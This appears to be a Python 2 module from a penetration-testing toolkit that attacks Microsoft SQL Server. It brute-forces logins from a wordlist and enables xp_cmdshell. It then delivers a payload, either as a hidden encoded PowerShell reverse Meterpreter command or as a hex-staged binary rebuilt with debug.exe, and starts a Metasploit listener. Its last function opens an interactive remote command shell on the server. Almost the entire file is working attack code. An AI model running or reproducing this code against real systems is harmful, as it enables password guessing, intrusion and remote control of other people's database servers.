#!/usr/bin/env python
from src.core.setcore import *
import src.core.tds as tds
import sys
import subprocess
import socket
import re
import os
import time
import binascii
import base64
import shutil


#
# this is the mssql modules
#

# define the base path
definepath = definepath()
operating_system = check_os()

msf_path = meta_path()

try:
    from impacket import tds
except ImportError:
    if os.path.isdir("/usr/share/pyshared/impacket"):
        sys.path.append("/usr/share/pyshared/impacket")
        import tds
        sys.path.append(definepath)

    else:
        print "[!] Impacket is not installed. This menu will not work."
        sys.exit()
#
# this is the brute forcer
#
def brute(ipaddr,username,port,wordlist):
    # if ipaddr being passed is invalid
    if ipaddr == "":
        return False
    if ipaddr != "":
        # base counter for successful brute force
        counter = 0
        # build in quick wordlist
        if wordlist == "default":
            wordlist = "src/fasttrack/wordlist.txt"

        # read in the file
        password = file(wordlist, "r")
        for passwords in password:
            passwords = passwords.rstrip()
            # try actual password
            try:
            
                ipaddr = str(ipaddr)
                print "Attempting to brute force " + bcolors.BOLD + ipaddr + bcolors.ENDC + " with username of " + bcolors.BOLD + username + bcolors.ENDC + " and password of " + bcolors.BOLD + passwords + bcolors.ENDC

                # connect to the sql server and attempt a password
                if ":" in ipaddr:   
                    #target_server = _mssql.connect(ipaddr, username, passwords)
                    ipaddr = ipaddr.split(":")
                    port = ipaddr[1]
                    ipaddr = ipaddr[0]
                    #target_server = _mssql.connect(ipaddr + ":" + str(port), username, passwords)
                sql_server = tds.MSSQL(str(ipaddr), int(port))

                # print that we were successful
                sql_server.connect()
                #target_server = False
                target_server = sql_server.login("master", username, passwords)
            
                if target_server:
                    print_status("\nSuccessful login with username %s and password: %s" % (username, passwords))
                    counter = 1
                    break

            # if login failed or unavailable server
            except Exception, e:
                    pass

        # if we brute forced a machine
        if counter == 1:
            if ":" in ipaddr:
                ipaddr = ipaddr.split(":")
                ipaddr = ipaddr[0]
            return ipaddr + "," + username + "," + str(port) + "," + passwords
        # else we didnt and we need to return a false
        else:
            if ipaddr != '':
                print_warning("Unable to guess the SQL password for %s with username of %s" % (ipaddr,username))
            return False


#
# this will deploy an already prestaged executable that reads in hexadecimal and back to binary
#
def deploy_hex2binary(ipaddr,port,username,password):

    mssql = tds.MSSQL(ipaddr, int(port))
    mssql.connect()
    mssql.login("master", username, password)
    print_status("Enabling the xp_cmdshell stored procedure...")
    try:
        mssql.sql_query("exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
    except: pass
    print_status("Checking if powershell is installed on the system...")
    # just throw a simple command via powershell to get the output
    mssql.sql_query("exec master..xp_cmdshell 'powershell -Version'")
    bundle = str(capture(mssql.printRows))
    # remove null byte terminators from capture output
    bundle = bundle.replace("\\x00", "")
    # search for parameter version - standard output for powershell -Version command
    match = re.search("parameter version", bundle)
    # if we have a match we have powershell installed
    if match:
        print_status("Powershell was detected on the remote system.")
        option_ps = raw_input("Do you want to use powershell injection? [yes/no]:")
        if option_ps.lower() == "" or option_ps == "y" or option_ps == "yes":
            option = "1"
            print_status("Powershell delivery selected. Boom!")
        else: option = "2"
    # otherwise, fall back to the older version using debug conversion via hex
    else:
        print_status("Powershell not detected, attempting Windows debug method.")
        option = "2"

    # if we don't have powershell
    if option == "2":
        try: reload(src.core.payloadgen.create_payloads)
        except: import src.core.payloadgen.create_payloads
        print_status("Connection established with SQL Server...")
        print_status("Converting payload to hexadecimal...")
        # if we are using a SET interactive shell payload then we need to make the path under web_clone versus ~./set
        if os.path.isfile(setdir + "/set.payload"):
            web_path = (setdir + "/web_clone/")
        # then we are using metasploit
        if not os.path.isfile(setdir + "/set.payload"):
            if operating_system == "posix":
                web_path = (setdir)
                # if it isn't there yet
                if not os.path.isfile(setdir + "/1msf.exe"):
                    # move it then
                    subprocess.Popen("cp %s/msf.exe %s/1msf.exe" % (setdir, setdir), shell=True).wait()
                subprocess.Popen("cp %s/1msf.exe %s/ 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
                subprocess.Popen("cp %s/msf2.exe %s/msf.exe 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
        fileopen = file("%s/1msf.exe" % (web_path), "rb")
        # read in the binary
        data = fileopen.read()
        # convert the binary to hex
        data = binascii.hexlify(data)
        # we write out binary out to a file
        filewrite = file(setdir + "/payload.hex", "w")
        filewrite.write(data)
        filewrite.close()

        # if we are using metasploit, start the listener
        if not os.path.isfile(setdir + "/set.payload"):
            if operating_system == "posix":
                try:reload(pexpect)
                except: import pexpect
                print_status("Starting the Metasploit listener...")
                msf_path = meta_path()
                child2 = pexpect.spawn("%smsfconsole -r %s/meta_config\r\n\r\n" % (meta_path(),setdir))

        # random executable name
        random_exe = generate_random_string(10,15)

    #
    # next we deploy our hex to binary if we selected option 1 (powershell)
    #

    if option == "1":
        print_status("Using universal powershell x86 process downgrade attack..")
        payload = "x86"

        # specify ipaddress of reverse listener
        ipaddr = grab_ipaddress()
        update_options("IPADDR=" + ipaddr)
        port = raw_input(setprompt(["29"], "Enter the port for the reverse [443]"))
        if port == "": port = "443"
        update_options("PORT=" + port)
        update_options("POWERSHELL_SOLO=ON")
        print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")
        filewrite = file(setdir + "/payload_options.shellcode", "w")
        # format needed for shellcode generation
        filewrite.write("windows/meterpreter/reverse_tcp" + " " + port + ",")
        filewrite.close()
        try: reload(src.payloads.powershell.prep)
        except: import src.payloads.powershell.prep
        # create the directory if it does not exist
        if not os.path.isdir(setdir + "/reports/powershell"):
            os.makedirs(setdir + "/reports/powershell")

        x86 = file(setdir + "/x86.powershell", "r")
        x86 = x86.read()
        x86 = "powershell -nop -win hidden -noni -enc " + x86
        print_status("If you want the powershell commands and attack, they are exported to %s/reports/powershell/" % (setdir))
        filewrite = file(setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
        filewrite.write(x86)
        filewrite.close()
        # if our payload is x86 based - need to prep msfconsole rc 
        if payload == "x86":
                powershell_command = x86
                powershell_dir = setdir + "/reports/powershell/x86_powershell_injection.txt"
                filewrite = file(setdir + "/reports/powershell/powershell.rc", "w")
                filewrite.write("use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lport %s\nset LHOST 0.0.0.0\nexploit -j" % (port))
                filewrite.close()

        # grab the metasploit path from config or smart detection
        msf_path = meta_path()
        if operating_system == "posix":
                try: reload(pexpect)
                except: import pexpect
                print_status("Starting the Metasploit listener...")
                child2 = pexpect.spawn("%smsfconsole -r %s/reports/powershell/powershell.rc" % (msf_path,setdir))
                print_status("Waiting for the listener to start first before we continue forward...")
                print_status("Be patient, Metaploit takes a little bit to start...")
                child2.expect("Starting the payload handler", timeout=30000)
                print_status("Metasploit started... Waiting a couple more seconds for listener to activate..")
                time.sleep(5)

        # assign random_exe command to the powershell command
        random_exe = powershell_command

    #
    # next we deploy our hex to binary if we selected option 2 (debug)
    #
    
    if option == "2":
        # we selected hex to binary
        fileopen = file("src/payloads/hex2binary.payload", "r")
        # specify random filename for deployment
        print_status("Deploying initial debug stager to the system.")
        random_file = generate_random_string(10,15)
        for line in fileopen:
            # remove bogus chars
            line = line.rstrip()
            # make it printer friendly to screen
            print_line = line.replace("echo e", "")
            print_status("Deploying stager payload (hex): " + bcolors.BOLD + str(print_line) + bcolors.ENDC)
            mssql.sql_query("exec master..xp_cmdshell '%s>> %s'" % (line,random_file))
        print_status("Converting the stager to a binary...")
        # here we convert it to a binary
        mssql.sql_query("exec master..xp_cmdshell 'debug<%s'" % (random_file))
        print_status("Conversion complete. Cleaning up...")
        # delete the random file
        mssql.sql_query("exec master..xp_cmdshell 'del %s'" % (random_file))

        # here we start the conversion and execute the payload
        print_status("Sending the main payload via to be converted back to a binary.")
        # read in the file 900 bytes at a time
        fileopen = file(setdir + "/payload.hex", "r")
        while fileopen:
            data = fileopen.read(900).rstrip()
            # if data is done then break out of loop because file is over
            if data == "": break
            print_status("Deploying payload to victim machine (hex): " + bcolors.BOLD + str(data) + bcolors.ENDC + "\n")
            mssql.sql_query("exec master..xp_cmdshell 'echo %s>> %s'" % (data, random_exe))
        print_status("Delivery complete. Converting hex back to binary format.")

        mssql.sql_query("exec master..xp_cmdshell 'rename MOO.bin %s.exe'" % (random_file))
        mssql.sql_query("exec master..xp_cmdshell '%s %s'" % (random_file, random_exe))
        # clean up the old files
        print_status("Cleaning up old files..")
        mssql.sql_query("exec master..xp_cmdshell 'del %s'" % (random_exe))

        # if we are using SET payload
        if os.path.isfile(setdir + "/set.payload"):
            print_status("Spawning seperate child process for listener...")
            try: shutil.copyfile(setdir + "/web_clone/x", definepath)
            except: pass

            # start a threaded webserver in the background
            subprocess.Popen("python src/html/fasttrack_http_server.py", shell=True)
            # grab the port options

            if check_options("PORT=") != 0:
                port = check_options("PORT=")

            # if for some reason the port didnt get created we default to 443
            else:
                port = "443"

    # thread is needed here due to the connect not always terminating thread, it hangs if thread isnt specified
    try: reload(thread)
    except: import thread

    # execute the payload
    # we append more commands if option 1 is used
    if option == "1":
            print_status("Triggering the powershell injection payload... ")
            sql_command = ("exec master..xp_cmdshell '%s'" % (powershell_command))            
            #mssql.sql_query("exec master..xp_cmdshell '%s'" % (powershell_command))
            thread.start_new_thread(mssql.sql_query, (sql_command,))

    # using the old method
    if option == "2":
        print_status("Triggering payload stager...")
        sql_command = ("xp_cmdshell '%s'" % (random_exe))
        # start thread of SQL command that executes payload
        thread.start_new_thread(mssql.sql_query, (sql_command,))
        time.sleep(1)

    # if pexpect doesnt exit right then it freaks out
    if os.path.isfile(setdir + "/set.payload"):
        os.system("python ../../payloads/set_payloads/listener.py")
    try:
        # interact with the child process through pexpect
        child2.interact()
        try:
            os.remove("x")
        except: pass
    except: pass


#
# this will deploy an already prestaged executable that reads in hexadecimal and back to binary
#
def cmdshell(ipaddr,port,username,password,option):
    # connect to SQL server
    mssql = tds.MSSQL(ipaddr, int(port))
    mssql.connect()
    mssql.login("master", username, password)
    print_status("Connection established with SQL Server...")
    print_status("Attempting to re-enable xp_cmdshell if disabled...")
    try:
        mssql.sql_query("exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
    except Exception, e: pass
    print_status("Enter your Windows Shell commands in the xp_cmdshell - prompt...")
    while 1:
        # prompt mssql
        cmd = raw_input("mssql>")
        # if we want to exit
        if cmd == "quit" or cmd == "exit": break
        # if the command isnt empty
        if cmd != "":
            # execute the command
            mssql.sql_query("exec master..xp_cmdshell '%s'" % (cmd))
            # print the rest of the data
            mssql.printReplies()
            mssql.colMeta[0]['TypeData'] = 80*2
            mssql.printRows()
